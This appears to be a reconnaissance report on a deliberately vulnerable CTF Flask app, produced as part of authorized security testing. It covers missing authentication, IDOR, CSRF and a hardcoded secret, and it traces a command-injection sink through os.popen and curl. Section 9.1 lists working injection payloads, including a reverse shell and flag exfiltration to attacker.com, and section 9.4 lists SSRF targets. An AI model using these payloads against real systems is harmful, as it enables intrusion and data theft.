# Reconnaissance Deliverable: SiteSaver Flask Application

## 0) HOW TO READ THIS

This reconnaissance report provides a comprehensive map of the SiteSaver Flask application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls (NOTE: THIS APPLICATION HAS ZERO GUARDS - all endpoints are public).
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping (NOTE: NO ROLES EXIST - application has no authentication system).
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. This application is a simple monolithic Flask app with no complex network architecture.

**Priority Order for Testing:** 
1. **CRITICAL:** Command injection vulnerability at `/add_url` - exploitable without authentication
2. **HIGH:** IDOR vulnerability at `/delete_url/<id>` - anyone can delete any URL
3. **MEDIUM:** Information disclosure at `/` - all URLs visible to everyone

**Application Context:** This is a CTF challenge application (XBEN-094-24) with intentional vulnerabilities for security testing purposes.

---

## 1. Executive Summary

**Application Purpose:** SiteSaver is a Flask-based URL management web application that validates and stores user-submitted URLs using curl to verify their accessibility before storage.

**Core Technology Stack:**
- **Backend:** Flask 3.0.3 (Python 3.8.17)
- **Database:** SQLite 3.x (file-based, unencrypted)
- **Server:** Werkzeug 3.0.3 development server
- **Container:** Docker (Debian Buster base image)
- **Hosting:** Localhost (http://localhost:5094)

**Primary User-Facing Components:**
1. **Home Page (/):** Displays all saved URLs with delete buttons
2. **Add URL Form (/add_url):** Submit new URLs for validation and storage
3. **Delete URL (/delete_url/<id>):** Remove URLs from the database

**Critical Security Posture:**
The application exhibits **CRITICAL security vulnerabilities** across multiple domains:
- **ZERO authentication/authorization controls** - All endpoints are publicly accessible
- **Command injection vulnerability** - Remote Code Execution via unvalidated URL parameter
- **No CSRF protection** - All POST endpoints vulnerable to cross-site request forgery
- **IDOR vulnerability** - Anyone can delete any URL by ID enumeration
- **Hardcoded weak secret key** - Session forgery possible
- **Debug mode enabled** - Werkzeug debugger provides additional RCE vector
- **No input validation** - User data flows directly to OS command execution

**Attack Surface Size:** 3 network-accessible endpoints, 1 critical command injection sink, 0 authentication barriers, 0 authorization checks.

---

## 2. Technology & Service Map

### Frontend
- **Framework:** Server-side rendered HTML with Jinja2 3.1.4 templates
- **JavaScript Libraries:** 
  - jQuery 3.5.1 (slim)
  - Bootstrap 4.5.2/5.1.3 (version mismatch - CSS v5, JS v4)
  - Popper.js 2.5.3
- **AJAX:** jQuery-based AJAX for form submission
- **Authentication Libraries:** NONE

### Backend
- **Language:** Python 3.8.17
- **Framework:** Flask 3.0.3
- **ORM:** Flask-SQLAlchemy 3.1.1 (SQLAlchemy 2.0.30)
- **Template Engine:** Jinja2 3.1.4
- **Session Library:** itsdangerous 2.2.0
- **Key Dependencies:**
  - Werkzeug 3.0.3 (development server, NOT production-grade)
  - MarkupSafe 2.1.5
  - blinker 1.8.2
  - click 8.1.7

### Infrastructure
- **Hosting Provider:** Docker container (localhost deployment)
- **CDN:** jsdelivr.net, stackpath.bootstrapcdn.com, code.jquery.com (for frontend assets)
- **Database Type:** SQLite 3.x (file: `/app/instance/urls.db`)
- **Web Server:** Werkzeug development server (port 5003 internal, 5094 external)
- **Container Base Image:** python:3.8-slim-buster (Debian Buster - EOL, no security updates)
- **TLS/HTTPS:** NOT CONFIGURED (HTTP only)

### Identified Subdomains
**Status:** NOT APPLICABLE - Application runs on localhost only
- No domain names configured
- No subdomains discovered
- Access via: http://localhost:5094

### Open Ports & Services
**From nmap scan (port 5094 mapped to container port 5003):**
- **Port 5094/tcp (External) → 5003/tcp (Internal):** Werkzeug/3.0.3 Python/3.8.17 HTTP server
  - Service: Flask application (SiteSaver)
  - Purpose: Main web application interface
  - Authentication: NONE
  - Access: Public (0.0.0.0 binding)

**Other Ports on Host (Out of Scope for This Application):**
- Port 80/tcp: Caddy httpd
- Port 443/tcp: SSL/HTTPS
- Port 631/tcp: CUPS 2.3
- Port 8081/tcp: Apache httpd 2.4.56
- Port 9999/tcp: Unknown service
- Port 49152/tcp: Tailscale

---

## 3. Authentication & Session Management Flow

### 3.1 Authentication Status

**CRITICAL FINDING:** This application implements **ZERO authentication controls**.

**Entry Points:** NONE - No authentication entry points exist
- No `/login` endpoint
- No `/register` or `/signup` endpoint
- No `/auth/*` routes
- No OAuth/SSO integration
- No API key authentication
- No token-based authentication

**Mechanism:** NOT APPLICABLE - No authentication mechanism exists

**All endpoints are publicly accessible without any identity verification.**

**Code Evidence:**
- **File:** `/app/app.py`
- **Lines 24-54:** All route handlers lack authentication decorators
- **No Flask-Login integration:** `requirements.txt` contains no authentication libraries
- **No authentication middleware:** No `@app.before_request` handlers for auth checks

### 3.2 Role Assignment Process

**Status:** NOT APPLICABLE - No user roles exist

**Role Determination:** N/A
**Default Role:** N/A (no user accounts exist)
**Role Upgrade Path:** N/A
**Code Implementation:** None

**Database Schema Analysis:**
```python
# File: /app/app.py, Lines 12-14
class URL(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    url = db.Column(db.String(255), nullable=False)
    # NO user_id column
    # NO role column
```

**Finding:** No User model exists in the application. URLs have no ownership tracking.

### 3.3 Privilege Storage & Validation

**Status:** NOT IMPLEMENTED

**Storage Location:** N/A (no privileges exist)
**Validation Points:** N/A (no validation occurs)
**Cache/Session Persistence:** Only Flask session for flash messages
**Code Pointers:** 
- **File:** `/app/app.py:6` - `app.secret_key = 'YourSecretKey'` (hardcoded weak secret)
- **File:** `/app/app.py:53` - `flash('URL deleted successfully!', 'success')` (only session usage)

### 3.4 Role Switching & Impersonation

**Status:** NOT APPLICABLE - No roles exist

**Impersonation Features:** None
**Role Switching:** None
**Audit Trail:** No logging exists (only `print(response)` at line 29 for curl output)
**Code Implementation:** N/A

### Session Management (Limited Implementation)

**Session Configuration:**
- **File:** `/app/app.py:6`
- **Secret Key:** `app.secret_key = 'YourSecretKey'` (CRITICAL vulnerability - hardcoded)
- **Session Cookie Flags:**
  - `SESSION_COOKIE_SECURE`: False (default) - Allows HTTP transmission
  - `SESSION_COOKIE_HTTPONLY`: True (default) - Prevents JavaScript access
  - `SESSION_COOKIE_SAMESITE`: None (default) - No CSRF protection
- **Session Storage:** Client-side signed cookies (Flask default)
- **Session Usage:** Only for flash messages, not authentication

**Security Issues:**
1. Hardcoded weak secret key enables session forgery
2. No HTTPS enforcement (HTTP only)
3. No CSRF protection on forms
4. Sessions not used for authentication (no user identity stored)

---

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints below are accessible through the target web application at http://localhost:5094.

### Complete Endpoint Table

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|---------------------|-------------------------|---------------------------|
| GET | `/` | **anon** (public) | None | None | **View all saved URLs.** Displays list of all URLs in database with delete buttons. No authentication required, no data filtering by user. **Code:** `/app/app.py:43-46` - `view_urls()` function retrieves all URLs via `URL.query.all()` and renders `view_urls.html` template. **Risk:** Information disclosure - anyone can view all saved URLs. |
| GET | `/add_url` | **anon** (public) | None | None | **Display URL submission form.** Renders HTML form for URL input. No authentication required. **Code:** `/app/app.py:24-41` - `add_url()` function (GET branch) returns `add_url.html` template. **Risk:** Exposes URL submission interface to all users. |
| POST | `/add_url` | **anon** (public) | None | None | **Submit URL for validation and storage (CRITICAL VULNERABILITY).** Accepts URL parameter, executes curl via os.popen() to validate, stores if returns 200. **Code:** `/app/app.py:24-41` - `add_url()` function (POST branch) accepts `request.form['url']`, passes to `check_url()` (lines 17-21) which uses `os.popen(command)` for shell execution. **CRITICAL RISK:** Command injection vulnerability - user input directly interpolated into shell command. Remote Code Execution possible. No authentication barrier. |
| POST | `/delete_url/<url_id>` | **anon** (public) | **url_id** (integer) | None (IDOR vulnerability) | **Delete URL by ID without ownership validation.** Accepts URL ID, deletes from database without checking ownership or permissions. **Code:** `/app/app.py:48-54` - `delete_url(url_id)` function retrieves URL via `URL.query.get_or_404(url_id)`, deletes without authorization check. **HIGH RISK:** Insecure Direct Object Reference (IDOR) - anyone can delete any URL by enumerating IDs (1, 2, 3, ...). No CSRF protection. |

### Endpoint Details

#### Endpoint 1: GET /
- **Handler:** `view_urls()` at `/app/app.py:43-46`
- **Authentication:** None (public)
- **Authorization:** None (no checks)
- **Input Parameters:** None
- **Database Query:** `URL.query.all()` (returns ALL URLs, no filtering)
- **Output:** HTML rendering of all URLs
- **Vulnerabilities:** Information disclosure (all users see all URLs)

#### Endpoint 2: GET /add_url
- **Handler:** `add_url()` at `/app/app.py:24-41` (GET branch)
- **Authentication:** None (public)
- **Authorization:** None (no checks)
- **Input Parameters:** None
- **Output:** HTML form for URL submission
- **Vulnerabilities:** None directly (displays form)

#### Endpoint 3: POST /add_url
- **Handler:** `add_url()` at `/app/app.py:24-41` (POST branch)
- **Authentication:** None (public)
- **Authorization:** None (no checks)
- **Input Parameters:**
  - `url` (string) - From `request.form['url']` at line 27
- **Processing Flow:**
  1. Line 27: `url = request.form['url']` (no validation)
  2. Line 28: `response = check_url(url)` (calls vulnerable function)
  3. Line 18: `command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'` (f-string interpolation)
  4. Line 19: `with os.popen(command) as output:` (shell execution)
  5. Line 30: `if '200' in response:` (functional validation, not security)
  6. Lines 31-33: Store URL in database via SQLAlchemy ORM
- **Output:** JSON response with success/failure message
- **Vulnerabilities:**
  - **CRITICAL:** Command injection via `os.popen()` - RCE without authentication
  - **HIGH:** SSRF - curl can access internal services and cloud metadata
  - **MEDIUM:** No CSRF protection
  - **MEDIUM:** No rate limiting

#### Endpoint 4: POST /delete_url/<url_id>
- **Handler:** `delete_url(url_id)` at `/app/app.py:48-54`
- **Authentication:** None (public)
- **Authorization:** None (no ownership check)
- **Input Parameters:**
  - `url_id` (integer) - Flask route converter validates as integer
- **Processing Flow:**
  1. Line 50: `url = URL.query.get_or_404(url_id)` (retrieves ANY URL by ID)
  2. Line 51: `db.session.delete(url)` (deletes without authorization)
  3. Line 52: `db.session.commit()` (commits deletion)
  4. Line 53: Flash success message
  5. Line 54: Redirect to `/`
- **Output:** HTTP 302 redirect to `/` with flash message
- **Vulnerabilities:**
  - **HIGH:** IDOR - anyone can delete any URL (no ownership validation)
  - **MEDIUM:** No CSRF protection
  - **MEDIUM:** No rate limiting (mass deletion possible)

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through http://localhost:5094 are reported below.

### 5.1 URL Parameters (Route Parameters)

| Input Name | Endpoint | Source Location | Data Type | Validation | Usage | Risk Level |
|------------|----------|----------------|-----------|------------|-------|------------|
| `url_id` | `/delete_url/<url_id>` | Flask route parameter | Integer | Flask `<int:>` converter + `get_or_404()` | Database lookup for deletion | **HIGH** (IDOR vulnerability - no ownership check) |

**Code Location:** `/app/app.py:48-50`
```python
@app.route('/delete_url/<int:url_id>', methods=['POST'])
def delete_url(url_id):
    url = URL.query.get_or_404(url_id)
```

### 5.2 POST Body Fields (JSON/Form)

| Field Name | Endpoint | Content-Type | Data Type | Validation | Sanitization | Sink | Risk Level |
|------------|----------|--------------|-----------|------------|--------------|------|------------|
| `url` | `/add_url` (POST) | application/x-www-form-urlencoded | String | **NONE** | **NONE** | `os.popen()` command execution | **CRITICAL** (Command injection → RCE) |

**Complete Data Flow:**
1. **Frontend Input:** `/app/templates/add_url.html:42`
   ```html
   <input type="text" class="form-control" id="url" name="url" placeholder="Enter URL here" required>
   ```
2. **AJAX Submission:** `/app/templates/add_url.html:55-59`
   ```javascript
   var url = $('#url').val();
   $.ajax({
       url: '/add_url',
       type: 'POST',
       data: {url: url},
   ```
3. **Backend Reception:** `/app/app.py:27`
   ```python
   url = request.form['url']
   ```
4. **Function Call:** `/app/app.py:28`
   ```python
   response = check_url(url)
   ```
5. **Command Construction:** `/app/app.py:18` (CRITICAL SINK)
   ```python
   command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'
   ```
6. **Command Execution:** `/app/app.py:19` (CRITICAL SINK)
   ```python
   with os.popen(command) as output:
   ```

**Validation Status:** ❌ **ZERO validation or sanitization**
**Attack Example:** `url=" && cat /app/flag.txt #` → RCE

### 5.3 HTTP Headers

**Status:** No user-controllable headers are explicitly processed by the application.

**Standard Headers (Processed by Framework):**
- `Content-Type` - Parsed by Flask automatically
- `Cookie` - Used for Flask session (signed with weak secret key)
- `Host` - Standard HTTP header
- `User-Agent` - Not accessed by application code

**Application Code Analysis:** No `request.headers` access found in `/app/app.py`

### 5.4 Cookie Values

| Cookie Name | Purpose | Set By | Security Flags | Validation | Risk |
|-------------|---------|--------|----------------|------------|------|
| `session` | Flask session (flash messages) | Flask framework | HttpOnly: True, Secure: False, SameSite: None | Signed with hardcoded weak key | **HIGH** (Session forgery possible with known secret 'YourSecretKey') |

**Cookie Configuration:** `/app/app.py:6`
```python
app.secret_key = 'YourSecretKey'  # Hardcoded weak secret
```

**Security Issues:**
- Weak hardcoded secret enables session forgery
- `SESSION_COOKIE_SECURE = False` allows HTTP transmission
- `SESSION_COOKIE_SAMESITE = None` enables CSRF attacks
- Session data visible to client (base64-encoded JSON)

### 5.5 Query String Parameters

**Status:** None found in the application.
**Code Analysis:** No `request.args` access in `/app/app.py`

---

## 6. Network & Interaction Map

**Network Surface Focus:** All components below are part of the deployed, network-accessible application at http://localhost:5094.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| Internet User | ExternAsset | Internet | Web Browser | None | External attacker or legitimate user (no distinction due to lack of authentication) |
| Flask App | Service | App | Python 3.8.17 / Flask 3.0.3 / Werkzeug 3.0.3 | PII (URLs may contain sensitive data), Flag file | Main application backend running in Docker container on port 5003 (exposed as 5094). **CRITICAL:** Contains command injection vulnerability. Runs as root in container. |
| SQLite Database | DataStore | Data | SQLite 3.x | URLs (plaintext, unencrypted) | File-based database at `/app/instance/urls.db`. World-readable (644 permissions). No encryption at rest. |
| Flag File | DataStore | Data | Text file | Flag value (CTF target) | Located at `/app/flag.txt`. Created at application startup from FLAG environment variable. World-readable (644 permissions). Target for command injection exploitation. |
| Docker Host | Service | App | Docker Engine | Container runtime data | Hosts the Flask application container. Internal IP: 172.17.0.1 (accessible from container via SSRF). |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| Flask App | **Hosts:** `http://localhost:5094` (external), `http://localhost:5003` (internal); **Endpoints:** `/` (GET), `/add_url` (GET/POST), `/delete_url/<id>` (POST); **Auth:** None (all public); **Dependencies:** SQLite Database, Flag File, Docker Host (for container runtime); **Container:** python:3.8-slim-buster base image; **User:** root (container runs as root); **Debug Mode:** Enabled (`debug=True`); **Secret Key:** 'YourSecretKey' (hardcoded); **Vulnerabilities:** Command injection (os.popen), IDOR, no CSRF protection, no authentication |
| SQLite Database | **Engine:** SQLite 3.x; **File:** `/app/instance/urls.db`; **Exposure:** Local filesystem only (not network-exposed); **Consumers:** Flask App; **Schema:** Single `url` table with `id` (INTEGER PRIMARY KEY) and `url` (VARCHAR(255)); **Encryption:** None (plaintext storage); **Permissions:** 644 (world-readable); **Connection String:** `sqlite:///urls.db` |
| Flag File | **Path:** `/app/flag.txt`; **Source:** FLAG environment variable (default: 'flag{this_is_a_fake_flag}'); **Permissions:** 644 (world-readable); **Created:** Application startup; **Purpose:** CTF challenge flag; **Exposure:** Readable via command injection or file:// SSRF |
| Docker Host | **IP:** 172.17.0.1 (from container perspective); **Reachable via:** SSRF in curl command injection; **Services:** Docker daemon, potentially other containers; **Metadata Endpoint:** Varies by cloud provider (AWS: 169.254.169.254, GCP: metadata.google.internal) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| Internet User → Flask App | HTTPS/HTTP | `:5094` → `:5003` | None | Public |
| Internet User → Flask App | HTTP POST | `:5094/add_url` | None | URLs (potentially malicious commands) |
| Internet User → Flask App | HTTP POST | `:5094/delete_url/<id>` | None | URL IDs |
| Flask App → SQLite Database | File I/O | Local filesystem `/app/instance/urls.db` | None | URLs (plaintext) |
| Flask App → Flag File | File I/O (read) | Local filesystem `/app/flag.txt` | None | Flag value (sensitive) |
| Flask App → OS Shell | Process execution | `os.popen()` → `/bin/sh -c` | None | User-controlled commands (CRITICAL) |
| Flask App → External URLs (via curl) | HTTP/HTTPS/File/etc | Variable (user-controlled) | None | SSRF vector - can access internal services, cloud metadata, local files |
| Flask App → Docker Host | HTTP (via SSRF) | `http://172.17.0.1:*` | None | Internal network reconnaissance |

### 6.4 Guards Directory

**CRITICAL FINDING:** This application has **ZERO security guards**. All flows are unprotected.

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | N/A | **No guards implemented.** All endpoints are publicly accessible without authentication, authorization, or security controls. |

**Missing Guards (Should Exist):**
| Expected Guard | Category | Purpose | Status |
|----------------|----------|---------|--------|
| auth:user | Auth | Requires valid user session or token | ❌ NOT IMPLEMENTED |
| auth:admin | Auth | Requires admin privileges | ❌ NOT IMPLEMENTED |
| ownership:user | ObjectOwnership | Verifies user owns target object | ❌ NOT IMPLEMENTED |
| csrf:token | Security | Validates CSRF token on state-changing requests | ❌ NOT IMPLEMENTED |
| rate:limit | RateLimit | Throttles requests to prevent abuse | ❌ NOT IMPLEMENTED |
| input:validate | Validation | Validates and sanitizes user input | ❌ NOT IMPLEMENTED |

---

## 7. Role & Privilege Architecture

**CRITICAL FINDING:** This application has **NO role or privilege system**. There is no authentication, no user accounts, and no authorization controls.

### 7.1 Discovered Roles

**Status:** ZERO roles exist

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| **Anonymous (implicit)** | 0 (lowest) | Global | All users are implicitly anonymous. No authentication system exists. All endpoints accessible without credentials. |

**Code Evidence:**
- No User model in database schema (`/app/app.py:12-14`)
- No role column in any table
- No authentication decorators on routes
- No role checking logic in any endpoint
- No Flask-Login, Flask-Principal, or similar libraries in `requirements.txt`

### 7.2 Privilege Lattice

**Status:** NOT APPLICABLE - No privilege hierarchy exists

```
Current State:
  anonymous (all users) → Full access to all endpoints

Expected State (Not Implemented):
  anon → user → admin
```

**Note:** All users (authenticated or not) have identical access because:
1. No authentication system exists
2. No role assignments occur
3. No authorization checks are performed
4. All endpoints are public

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| **Anonymous (all users)** | `/` | ALL routes: `/`, `/add_url`, `/delete_url/<id>` | None (no authentication) |

### 7.4 Role-to-Code Mapping

**Status:** NOT APPLICABLE - No roles exist

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| N/A | None | None | N/A |

---

## 8. Authorization Vulnerability Candidates

**CRITICAL CONTEXT:** This application has **ZERO authorization controls**. All endpoints below are publicly accessible without authentication.

### 8.1 Horizontal Privilege Escalation Candidates

**CRITICAL FINDING:** No user identity system exists, so traditional horizontal privilege escalation is not applicable. However, the IDOR vulnerability allows any user to access/modify any resource.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Vulnerability Details |
|----------|------------------|---------------------|-----------|-------------|----------------------|
| **CRITICAL** | `/delete_url/<url_id>` | `url_id` | URL records | HIGH (user data, potential PII in URLs) | **IDOR Vulnerability:** Any user can delete any URL by enumerating IDs (1, 2, 3, ...). No ownership validation. No authentication required. **Code:** `/app/app.py:48-54` - `URL.query.get_or_404(url_id)` retrieves any URL, `db.session.delete(url)` deletes without authorization check. **Impact:** Data destruction, denial of service. |
| **HIGH** | `/` (GET) | None (returns all records) | URL records | MEDIUM (information disclosure) | **No Data Filtering:** `URL.query.all()` returns ALL URLs to ALL users. No user-based filtering. Anyone can view all saved URLs. **Code:** `/app/app.py:45` - `urls = URL.query.all()` retrieves all records without filtering by user (no user concept exists). **Impact:** Privacy violation, information disclosure. |

### 8.2 Vertical Privilege Escalation Candidates

**Status:** NOT APPLICABLE - No role hierarchy exists

**Explanation:** Vertical privilege escalation requires different privilege levels (e.g., user → admin). This application has no user accounts, no roles, and no privilege levels. All users (anonymous) already have full access to all functionality.

**Endpoints That Should Require Higher Privileges (But Don't):**
| Endpoint | Functionality | Should Require | Current Requirement | Risk |
|----------|---------------|----------------|---------------------|------|
| `/delete_url/<id>` | Delete any URL | URL ownership or admin role | None (public) | HIGH |
| `/add_url` (POST) | Add URL (triggers command execution) | Authenticated user | None (public) | CRITICAL |

### 8.3 Context-Based Authorization Candidates

**Status:** NOT APPLICABLE - No multi-step workflows exist

**Application Workflow Analysis:**
1. **URL Submission:** Single-step process (POST to `/add_url`)
2. **URL Deletion:** Single-step process (POST to `/delete_url/<id>`)
3. **URL Viewing:** Single-step process (GET to `/`)

**Finding:** No multi-step workflows that assume prior state completion. No context-based authorization vulnerabilities beyond the complete lack of authorization.

### 8.4 Unauthenticated Access to Sensitive Functionality

| Priority | Endpoint | Functionality | Risk Level | Details |
|----------|----------|---------------|------------|---------|
| **CRITICAL** | `POST /add_url` | Command injection → RCE | CRITICAL | **No authentication barrier before command injection vulnerability.** Any external attacker can execute arbitrary OS commands via `os.popen()`. **Code:** `/app/app.py:17-21, 24-41`. **Exploit:** `url=" && cat /app/flag.txt #` executes commands on server. **Impact:** Complete system compromise, flag exfiltration, reverse shell access. |
| **HIGH** | `POST /delete_url/<id>` | Delete any URL (IDOR) | HIGH | **No authentication required to delete resources.** Mass deletion attack possible by enumerating IDs. **Code:** `/app/app.py:48-54`. **Impact:** Data destruction, denial of service. |
| **MEDIUM** | `GET /` | View all URLs | MEDIUM | **Information disclosure.** All users see all saved URLs without authentication. **Code:** `/app/app.py:43-46`. **Impact:** Privacy violation, potential exposure of sensitive internal URLs. |

---

## 9. Injection Sources (Command Injection and SQL Injection)

### 9.1 Command Injection Sources

**CRITICAL VULNERABILITY FOUND: 1**

#### Command Injection Source #1: os.popen() in check_url()

**Vulnerability Type:** Remote Code Execution via Command Injection

**Severity:** CRITICAL

**Complete Data Flow Trace:**

1. **User Input Origin (HTTP Request):**
   - **Endpoint:** POST `/add_url`
   - **Parameter:** `url` (form field)
   - **Content-Type:** `application/x-www-form-urlencoded`
   - **Frontend:** `/app/templates/add_url.html:42, 55, 59`
   - **Authentication Required:** NO (public endpoint)

2. **Backend Input Reception:**
   - **File:** `/app/app.py`
   - **Line:** 27
   - **Code:** `url = request.form['url']`
   - **Validation:** ❌ NONE
   - **Sanitization:** ❌ NONE

3. **Pass to Vulnerable Function:**
   - **File:** `/app/app.py`
   - **Line:** 28
   - **Code:** `response = check_url(url)`
   - **Processing:** Direct pass-through, no validation

4. **Command Construction (Dangerous Sink):**
   - **File:** `/app/app.py`
   - **Line:** 18
   - **Code:** `command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'`
   - **Injection Point:** User input directly interpolated into f-string
   - **Quote Escaping:** ❌ NONE
   - **Shell Metacharacter Filtering:** ❌ NONE

5. **Command Execution (CRITICAL SINK):**
   - **File:** `/app/app.py`
   - **Line:** 19
   - **Code:** `with os.popen(command) as output:`
   - **Execution Method:** `os.popen()` spawns shell with `/bin/sh -c`
   - **Shell Context:** Full shell interpretation enabled
   - **User Privileges:** root (in Docker container)

**Complete Vulnerable Function:**
```python
# /app/app.py, Lines 17-21
def check_url(url):
    command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'
    with os.popen(command) as output:
        response = output.read().strip()
    return response
```

**Exploitation Examples:**

| Payload | Executed Command | Impact |
|---------|------------------|--------|
| `" && cat /app/flag.txt #` | `curl ... "" && cat /app/flag.txt #"` | Read flag file |
| `" && whoami #` | `curl ... "" && whoami #"` | Identify user (root) |
| `"; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #` | `curl ..."; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #` | Reverse shell |
| `" && curl http://attacker.com/$(cat /app/flag.txt) #` | `curl ... "" && curl http://attacker.com/$(cat /app/flag.txt) #` | Exfiltrate flag via DNS/HTTP |

**Bypass of Weak Validation:**
- **Weak Check:** Line 30 checks if `'200' in response`
- **Purpose:** Functional validation (URL returned HTTP 200)
- **Security Value:** NONE - Occurs AFTER command execution
- **Bypass:** Attacker controls response via command injection

**Network Accessibility:** ✅ YES - Endpoint is publicly accessible without authentication at http://localhost:5094/add_url

### 9.2 SQL Injection Sources

**Status:** ✅ PROTECTED - NO SQL INJECTION VULNERABILITIES FOUND

**Protection Mechanism:** SQLAlchemy ORM with parameterized queries

**Database Operations Analyzed:**

1. **SELECT All URLs:**
   - **File:** `/app/app.py:45`
   - **Code:** `urls = URL.query.all()`
   - **User Input:** None
   - **Status:** ✅ Safe (ORM method, no user input)

2. **SELECT URL by ID:**
   - **File:** `/app/app.py:50`
   - **Code:** `url = URL.query.get_or_404(url_id)`
   - **User Input:** `url_id` (integer, validated by Flask route converter)
   - **Status:** ✅ Safe (ORM parameterized query)

3. **INSERT URL:**
   - **File:** `/app/app.py:31-33`
   - **Code:**
     ```python
     new_url = URL(url=url)
     db.session.add(new_url)
     db.session.commit()
     ```
   - **User Input:** `url` (string from `request.form['url']`)
   - **Status:** ✅ Safe (ORM parameterized insertion)
   - **Note:** While user input is stored, SQLAlchemy prevents SQL injection via parameterization

4. **DELETE URL:**
   - **File:** `/app/app.py:51-52`
   - **Code:**
     ```python
     db.session.delete(url)
     db.session.commit()
     ```
   - **User Input:** `url_id` (integer, validated by Flask)
   - **Status:** ✅ Safe (ORM deletion method)

**Raw SQL Analysis:**
- **Patterns Searched:** `execute()`, `executemany()`, `raw()`, `text()`, SQL string concatenation with user input
- **Result:** ❌ NONE FOUND
- **Conclusion:** Application exclusively uses SQLAlchemy ORM. No raw SQL queries exist.

**SQL Injection Risk:** ✅ LOW - Framework-level protection via ORM parameterization

### 9.3 Additional Dangerous Functions Analysis

**Search Results:**
- `subprocess.*` - ❌ NOT FOUND
- `os.system()` - ❌ NOT FOUND  
- `eval()` - ❌ NOT FOUND
- `exec()` - ❌ NOT FOUND
- `compile()` - ❌ NOT FOUND
- `__import__()` - ❌ NOT FOUND

**Conclusion:** Only ONE command injection sink exists: `os.popen()` at `/app/app.py:19`

### 9.4 Server-Side Request Forgery (SSRF) Source

**Note:** The same curl command injection vulnerability also enables SSRF attacks.

**SSRF Capabilities:**
- **Internal Service Access:** `http://127.0.0.1:*`, `http://172.17.0.1:*`
- **Cloud Metadata:** `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal` (GCP)
- **File System Access:** `file:///etc/passwd`, `file:///app/flag.txt`
- **Port Scanning:** Enumerate internal services via response timing
- **Protocol Support:** curl supports http, https, file, ftp, gopher, dict, ldap, smb

**Code Location:** Same as command injection (`/app/app.py:17-21`)

---

## 10. Additional Attack Surface Notes

### 10.1 CSRF Vulnerabilities

**All POST endpoints lack CSRF protection:**

1. **POST /add_url** - No CSRF token
   - **Form:** `/app/templates/add_url.html:39-45`
   - **Risk:** Attacker can force victims to submit malicious URLs
   
2. **POST /delete_url/<id>** - No CSRF token
   - **Form:** `/app/templates/view_urls.html:53-55`
   - **Risk:** Attacker can force victims to delete URLs

**CSRF Protection Status:** ❌ NOT IMPLEMENTED
- No Flask-WTF library installed
- No CSRF tokens in forms
- No CSRF validation in backend
- `SESSION_COOKIE_SAMESITE = None` (no cookie-based CSRF defense)

### 10.2 Stored XSS Analysis

**Status:** ✅ MITIGATED by Jinja2 auto-escaping

**Potential Sink:**
- **File:** `/app/templates/view_urls.html:52`
- **Code:** `{{ url.url }}` (renders stored URLs)
- **Protection:** Jinja2 auto-escaping converts `<` to `&lt;`, `>` to `&gt;`, etc.
- **Risk:** LOW (auto-escaping enabled by default in Flask)

**Verification:** Would need to confirm Flask configuration doesn't disable auto-escaping with `autoescape=False` or use `|safe` filter.

### 10.3 Information Disclosure

1. **Debug Mode Enabled:**
   - **File:** `/app/app.py:66`
   - **Code:** `app.run(host='0.0.0.0', port=5003, debug=True)`
   - **Risk:** Werkzeug debugger exposes stack traces, code, and variables
   - **Impact:** Information disclosure, potential code execution via debugger

2. **Hardcoded Secret Key:**
   - **File:** `/app/app.py:6`
   - **Code:** `app.secret_key = 'YourSecretKey'`
   - **Risk:** Secret visible in source code, enables session forgery
   - **Impact:** Session cookie forgery, potential CSRF token bypass

3. **Flag File Readable:**
   - **File:** `/app/flag.txt` (created at startup)
   - **Permissions:** 644 (world-readable)
   - **Risk:** Accessible via command injection or file:// SSRF
   - **Impact:** CTF flag exfiltration

### 10.4 Rate Limiting

**Status:** ❌ NOT IMPLEMENTED

**Impact:**
- Unlimited command injection attempts
- Mass URL deletion possible
- DoS via resource exhaustion
- No request throttling on any endpoint

### 10.5 Security Headers

**Status:** ❌ NOT CONFIGURED

**Missing Headers:**
- `Content-Security-Policy` - No XSS defense in depth
- `X-Frame-Options` - No clickjacking protection
- `Strict-Transport-Security` - N/A (HTTP only, no HTTPS)
- `X-Content-Type-Options: nosniff` - No MIME sniffing protection
- `Referrer-Policy` - No referrer control

---

## 11. Summary of Critical Findings

### Severity: CRITICAL
1. **Command Injection (RCE)** - `/app/app.py:17-21` - Remote Code Execution via `os.popen()` without input validation. Public endpoint, no authentication.
2. **No Authentication System** - All endpoints publicly accessible without identity verification.
3. **Hardcoded Weak Secret Key** - `/app/app.py:6` - Enables session forgery and CSRF token bypass.

### Severity: HIGH  
4. **IDOR Vulnerability** - `/app/app.py:48-54` - Anyone can delete any URL without ownership validation.
5. **No CSRF Protection** - All POST endpoints vulnerable to cross-site request forgery.
